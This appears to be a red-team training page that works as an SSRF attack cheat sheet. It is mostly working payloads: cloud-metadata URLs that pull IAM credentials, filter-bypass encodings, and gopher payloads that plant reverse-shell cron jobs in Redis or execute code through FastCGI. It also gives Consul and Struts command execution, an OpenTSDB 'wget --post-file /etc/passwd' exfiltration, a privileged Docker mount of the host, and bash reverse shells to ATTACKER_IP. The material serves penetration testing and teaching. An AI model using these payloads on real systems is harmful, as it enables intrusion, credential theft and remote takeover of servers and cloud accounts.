---
layout: training-page
title: "SSRF — Red Team Academy"
module: "Web Hacking"
tags:
  - ssrf
  - cloud-metadata
  - imds
  - filter-bypass
  - blind-ssrf
page_key: "web-ssrf"
render_with_liquid: false
---

# Server-Side Request Forgery (SSRF)

SSRF tricks the server into making HTTP requests to attacker-specified destinations — reaching internal services, cloud metadata APIs, and loopback interfaces unreachable from the outside. In cloud environments, SSRF can yield IAM credentials leading to full account compromise.

## Basic SSRF Detection

```
# Find parameters that accept URLs:
?url=, ?link=, ?src=, ?path=, ?redirect=, ?image=, ?fetch=, ?load=, ?callback=

# Test with your server (Burp Collaborator, interactsh):
?url=http://BURP-COLLAB.burpcollaborator.net/test
# If you get a DNS/HTTP hit → SSRF confirmed

# Internal network probe:
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://0.0.0.0/
?url=http://[::1]/       # IPv6 loopback

# Port scan via SSRF (timing-based or error-based):
?url=http://127.0.0.1:22    # SSH
?url=http://127.0.0.1:3306  # MySQL
?url=http://127.0.0.1:6379  # Redis
?url=http://127.0.0.1:8080  # Internal admin
?url=http://127.0.0.1:9200  # Elasticsearch
```

## Cloud Metadata — AWS IMDSv1

```
# AWS EC2 Instance Metadata Service (IMDSv1 — no token required):
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns temporary AWS keys:
# { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }

# Use credentials with AWS CLI:
AWS_ACCESS_KEY_ID=ASIA... \
AWS_SECRET_ACCESS_KEY=... \
AWS_SESSION_TOKEN=... \
aws s3 ls

# Other useful metadata endpoints:
?url=http://169.254.169.254/latest/user-data              # startup scripts
?url=http://169.254.169.254/latest/meta-data/hostname
?url=http://169.254.169.254/latest/meta-data/public-keys/
```

## Cloud Metadata — AWS IMDSv2 Bypass

IMDSv2 requires a PUT request to get a token first. Some SSRF vulnerabilities support redirects or custom headers allowing IMDSv2 bypass.

```
# IMDSv2 requires PUT with X-aws-ec2-metadata-token-ttl-seconds header:
# Step 1: Get token (requires PUT — only works if SSRF supports PUT or redirect):
?url=http://169.254.169.254/latest/api/token
# With: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# With: X-aws-ec2-metadata-token: TOKEN

# Bypass via redirect:
# If SSRF follows redirects, serve a redirect from your server:
# GET /redirect → 301 to http://169.254.169.254/... with custom headers

# Note: IMDSv2 doesn't protect against all SSRF — instance profile
# actions can still be exploited if SSRF can send PUT
```

## Cloud Metadata — GCP & Azure

```
# Google Cloud Platform (GCP):
?url=http://metadata.google.internal/computeMetadata/v1/
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google
# If SSRF allows custom headers: add Metadata-Flavor: Google

# Microsoft Azure IMDS:
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true

# DigitalOcean:
?url=http://169.254.169.254/metadata/v1/
?url=http://169.254.169.254/metadata/v1/id
?url=http://169.254.169.254/metadata/v1/user-data
```

## SSRF Filter Bypass Techniques

```
# IP notation alternatives for 127.0.0.1:
http://0x7f000001/         # hex
http://2130706433/         # decimal integer
http://0177.0.0.1/         # octal
http://127.1/              # shortened
http://[::1]/              # IPv6
http://[::ffff:127.0.0.1]/ # IPv4-mapped IPv6

# Domain-based bypass:
http://localtest.me/        # resolves to 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
http://[::ffff:7f00:1]/

# URL scheme abuse:
file:///etc/passwd           # read local files
dict://127.0.0.1:11211/stat  # Memcached interaction
gopher://127.0.0.1:6379/_    # Redis interaction
gopher://127.0.0.1:25/...    # SMTP interaction

# Redirect bypass (if SSRF follows redirects):
# Host a page that redirects to 169.254.169.254
?url=https://your-server.com/redirect?to=http://169.254.169.254/

# URL parser confusion:
http://foo@169.254.169.254/  # some parsers use foo as host
http://169.254.169.254#@target.com/
http://169.254.169.254\target.com/

# Protocol-relative:
//169.254.169.254/metadata
```

## Blind SSRF with DNS Callback

```
# When no HTTP response returned but DNS requests are made:
# Use interactsh or Burp Collaborator:

# Setup interactsh:
interactsh-client
# Get your callback URL: xxxxxxxx.oast.live

# Trigger DNS callback:
?url=http://xxxxxxxx.oast.live/test

# DNS-based data exfiltration (encode data in subdomain):
# If SSRF can be chained to read internal data:
?url=http://$(cat /etc/hostname).xxxxxxxx.oast.live/

# Blind SSRF to internal services (error-based detection):
?url=http://192.168.1.1:22    # TCP connect — timeout vs refused = different response
?url=http://192.168.1.1:9999  # open vs closed port response time differs

# Scan entire subnet via SSRF (use Burp Intruder with time tracking):
?url=http://192.168.1.1/     # 1ms = closed
?url=http://192.168.1.2/     # 5000ms = open (port filtered)
?url=http://192.168.1.3/     # 2ms = closed
```

## SSRF to Redis / Memcached RCE

```
# Gopher protocol allows crafting raw TCP payloads:
# Redis — write cron job for RCE (if Redis has no auth):
gopher://127.0.0.1:6379/_MULTI%0d%0aSET%20/etc/cron.d/redis%20...

# Or use gopherus to generate payloads:
# https://github.com/tarunkant/Gopherus
python gopherus.py --exploit redis
python gopherus.py --exploit mysqld
python gopherus.py --exploit fastcgi
```

## Blind SSRF Exploit Chains (assetnote)

When SSRF is blind (no response body returned), you can still prove impact by chaining it to internal services. Replace `SSRF_CANARY` with your interactsh/Burp Collaborator callback URL. Source: assetnote/blind-ssrf-chains.

### SSRF Canaries — Validate Internal Access

Some internal apps make outbound requests themselves. If you hit an SSRF canary endpoint and your callback receives a request, you've confirmed access to that internal network segment.

```
# Confluence (older versions — Sharelinks)
GET /rest/sharelinks/1.0/link?url=https://SSRF_CANARY/

# Confluence / Jira / Bitbucket — iconUriServlet (CVE-2017-9506)
GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY

# Jira makeRequest (CVE-2019-8451, Jira < 8.4.0)
GET /plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com

# Jenkins (CVE-2018-1000600)
GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=user&password=pass

# Hystrix Dashboard (Spring Cloud Netflix < 2.2.4, CVE-2020-5412)
GET /proxy.stream?origin=http://SSRF_CANARY/

# GitLab Prometheus Redis Exporter (GitLab < 13.1.1, CVE-2020-13379)
# Dumps all Redis keys via target parameter:
GET http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```

### Blind SSRF → Elasticsearch

```
# Port: 9200 (usually unauthenticated internally)
# Status code probe (partial blind SSRF):
GET /_cluster/health
GET /_cat/indices
GET /_cat/health

# Shutdown (Elasticsearch 1.6 and below only):
POST /_shutdown
POST /_cluster/nodes/_master/_shutdown
```

### Blind SSRF → Weblogic (CVE-2014-4210 / CVE-2020-14883)

```
# Ports: 80, 443, 7001, 8888
# UDDI Explorer SSRF canary (CVE-2014-4210):
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search

# Console path traversal SSRF → RCE (CVE-2020-14883, Linux):
POST /console/css/%252e%252e%252fconsole.portal
Content-Type: application/x-www-form-urlencoded

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```

### Blind SSRF → Jenkins RCE via Groovy

```
# Port: 80, 8080, 8888
# Unauthenticated Groovy script execution via checkScript:
GET /org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw',root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange',module='poc',version='1')%0aimport Orange;

# RCE via Groovy (authenticated):
cmd = 'curl SSRF_CANARY'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
url = '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + quote(pay)
```

### Blind SSRF → Apache Solr

```
# Port: 8983
# Shards parameter SSRF canary:
GET /search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
GET /solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json

# XXE SSRF canary (Solr 7.0.1):
GET /solr/gettingstarted/select?q={!xmlparser+v='<!DOCTYPE+a+SYSTEM+"http://SSRF_CANARY/xxx"'><a></a>'}
```

### Blind SSRF → Apache Struts (CVE-2016)

```
# Ports: 80, 443, 8080, 8443
# Struts2-016 — append to any internal endpoint:
GET /some/path?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```

### Blind SSRF → OpenTSDB RCE

```
# Port: 4242
# RCE via query parameter (CVE-2020-35476):
GET /q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```

### Blind SSRF → Docker API RCE

```
# Ports: 2375 (HTTP), 2376 (SSL)
# Check presence:
GET /containers/json
GET /secrets
GET /services

# Create privileged container (mounts host filesystem):
POST /containers/create?name=evil
Content-Type: application/json

{"Image":"alpine","Cmd":["/usr/bin/tail","-f","1234","/dev/null"],"Binds":["/:/mnt"],"Privileged":true}

# Start it:
POST /containers/evil/start
```

### Blind SSRF → Redis RCE (Gopher)

```
# Port: 6379 (unauthenticated internal Redis — common in containers)
# Use gopherus to generate payload automatically:
python gopherus.py --exploit redis

# Manual Gopher — write reverse shell cron:
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

# GitLab Prometheus Redis Exporter (dump all keys):
GET http://localhost:9121/scrape?target=redis://127.0.0.1:6379&check-keys=*
```

### Blind SSRF → Memcache RCE (Gopher)

```
# Port: 11211
gopher://[target]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
```

### Blind SSRF → FastCGI RCE (Gopher)

```
# Port: 9000 (PHP-FPM)
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%27%29%3Bdie%28%27-----fin-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```

### Blind SSRF → Hashicorp Consul RCE

```
# Ports: 8500 (HTTP), 8501 (SSL)
# Consul allows registering services with health check scripts.
# POST a new service with a shell command as the health check:
POST http://internal-consul:8500/v1/agent/service/register
Content-Type: application/json

{
  "ID": "evil",
  "Name": "evil",
  "Address": "127.0.0.1",
  "Port": 80,
  "Check": {
    "DeregisterCriticalServiceAfter": "90m",
    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],
    "Interval": "10s",
    "Timeout": "10s"
  }
}
```

### Side-Channel Detection (When No Response)

```
# Response timing:
# - Fast response (~1ms): port closed / host unreachable
# - Slow response (~5s timeout): port open but no data

# Response status code differences:
# - 200 OK: internal service responded
# - 500 Internal Server Error: host reachable, service rejected request

# DNS-based side channel (no HTTP needed):
# Request hits your callback DNS server → SSRF confirmed even without HTTP response

# Use interactsh for all blind callbacks:
interactsh-client
# Gives you: xxxxxxxx.oast.live
# Test: ?url=http://xxxxxxxx.oast.live/probe
# Watch for DNS and HTTP callbacks
```

### surf — SSRF Candidate Discovery

surf identifies viable SSRF candidates from a list of subdomains/hosts. It probes each host from your machine — hosts that don't respond externally but resolve to internal IPs are prime SSRF targets, since traditional SSRF filters usually only block private IP ranges by explicit blacklist.

```
# Install (requires Go 1.19+):
go install github.com/assetnote/surf/cmd/surf@latest

# Find all SSRF candidates from a subdomain list:
surf -l bigcorp.txt

# With timeout and concurrency tuning:
surf -l bigcorp.txt -t 10 -c 200

# Print all hosts without SSRF analysis (raw list only):
surf -l bigcorp.txt -d

# Find hosts resolving to internal IPs only (no HTTP probing):
surf -l bigcorp.txt -x

# Options:
# -l FILE     list of hosts or subdomains
# -c N        concurrency (default 100)
# -t N        timeout in seconds (default 3)
# -r N        retries on failure (default 2)
# -x          disable HTTP probing, only output internal-resolving hosts
# -d          disable analysis, output raw list

# Output files saved automatically:
# external-<timestamp>.txt  — resolves externally but HTTP unreachable (highest value SSRF targets)
# internal-<timestamp>.txt  — resolves to RFC1918 address

# Workflow — SSRF hunting pipeline:
# 1. Enumerate subdomains: subfinder -d bigcorp.com -o subs.txt
# 2. Filter SSRF candidates: surf -l subs.txt -c 200 -t 5
# 3. Use external-*.txt targets as SSRF payloads in application parameters:
#    ?url=http://s3-internal.bigcorp.com/    (external IP, not blocked by IP filters)
#    ?url=http://internal-app.bigcorp.com/   (internal IP, classic SSRF)
# 4. Try each candidate against SSRF-vulnerable parameters:
#    while read host; do curl -s "https://app.bigcorp.com/fetch?url=http://$host/" -o /dev/null -w "$host: %{http_code}\n"; done < external-candidates.txt
```

### SSRF Tools

```
# Gopherus — generate Gopher payloads for Redis, MySQL, FastCGI, Memcache:
git clone https://github.com/tarunkant/Gopherus
python gopherus.py --exploit redis
python gopherus.py --exploit fastcgi
python gopherus.py --exploit mysqld

# SSRFmap — automated SSRF exploitation:
git clone https://github.com/swisskyrepo/SSRFmap
python ssrfmap.py -r req.txt -p url -m redis

# SSRF Proxy — tunnel HTTP through SSRF-vulnerable endpoint:
# github.com/bcoles/ssrf_proxy

# remote-method-guesser — Java RMI via SSRF (Gopher):
# rmg serial 127.0.0.1 1099 CommonsCollections6 'curl SSRF_CANARY' --ssrf --gopher
```

## SSRF Payload Library

Additional bypass payloads and redirect techniques from PayloadsAllTheThings.

### Localhost Bypass Variants

```
# IPv6 notation alternatives:
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# CIDR loopback range (127.x.x.x all resolve locally):
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Domain redirect services:
http://localtest.me/          # resolves to ::1
http://localh.st/             # resolves to 127.0.0.1
http://company.127.0.0.1.nip.io/   # nip.io maps any IP as DNS
http://spoofed.redacted.oastify.com/  # Burp Collaborator redirect

# Encoded IP variants (all = 127.0.0.1):
http://0x7f000001/            # hexadecimal
http://2130706433/            # decimal
http://0177.0.0.1/            # octal
http://127.1/                 # shortened notation
```

### Protocol Scheme Abuse

```
# file:// — read local files directly:
file:///etc/passwd
file:///c:/windows/win.ini

# dict:// — interact with dict servers / Memcached probe:
dict://127.0.0.1:11211/stat

# sftp:// — trigger SFTP connection (OOB callback):
sftp://attacker.com:11111/

# tftp:// — UDP-based file transfer probe:
tftp://attacker.com:12345/TESTUDPPACKET

# ldap:// — trigger LDAP connection (OOB):
ldap://localhost:389/%0astats%0aquit

# gopher:// — craft arbitrary TCP payloads:
gopher://127.0.0.1:6379/_PING  -- Redis ping
gopher://127.0.0.1:9200/_      -- Elasticsearch probe

# netdoc:// (Java URL handler):
netdoc:///etc/passwd

# jar:// (SSRF + XXE bypass in Java):
jar:https://attacker.com/payload.jar!/
```

## Cloud Metadata Endpoints

Extended cloud provider metadata endpoints from PayloadsAllTheThings.

```
# AWS IMDSv1 (no auth required):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/public-keys/

# AWS alternative IPs (bypass naive IP-based filters):
http://169.254.169.254.nip.io/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/

# GCP (requires Metadata-Flavor: Google header):
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure (requires Metadata: true header):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/

# DigitalOcean:
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address

# Oracle Cloud Infrastructure:
http://169.254.169.254/opc/v1/instance/

# Alibaba Cloud:
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

## SSRF Bypass Techniques

Advanced filter bypass techniques from PayloadsAllTheThings for strict SSRF validators.

### URL Parser Discrepancy Abuse

```
# PHP filter_var() bypass — accepts these as valid:
http://0/
http://127.0.0.1:80@0/
http://0.0.0.0:80

# @-based confusion (user info trick):
http://attacker.com@169.254.169.254/
http://169.254.169.254#@attacker.com/
http://169.254.169.254%23@attacker.com/

# Backslash (some parsers treat as forward slash):
http://169.254.169.254\attacker.com/

# Embedded credentials:
http://user:password@169.254.169.254/

# Fragment-based bypass:
http://attacker.com#@169.254.169.254/

# DNS rebinding — domain resolves to external IP first, then rebinds to internal:
# Use: https://github.com/taviso/rbndr or singularity.me for rebinding attacks
```

### JAR Scheme and Other Java SSRF

```
# JAR URL handler in Java — can cause the server to download any URL:
jar:https://attacker.com/evil.jar!/
jar:file:///var/www/html/app.war!/WEB-INF/web.xml

# Remote Method Guesser — Java RMI via SSRF:
rmg serial 127.0.0.1 1099 CommonsCollections6 'curl attacker.com/rce' --ssrf --gopher
```

## Resources

- PortSwigger SSRF labs — `portswigger.net/web-security/ssrf`
- assetnote blind-ssrf-chains — `github.com/assetnote/blind-ssrf-chains`
- PayloadsAllTheThings SSRF — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery`
- interactsh — `github.com/projectdiscovery/interactsh`
- Gopherus — `github.com/tarunkant/Gopherus`
- SSRFmap — `github.com/swisskyrepo/SSRFmap`
- surf — SSRF candidate finder — `github.com/assetnote/surf`
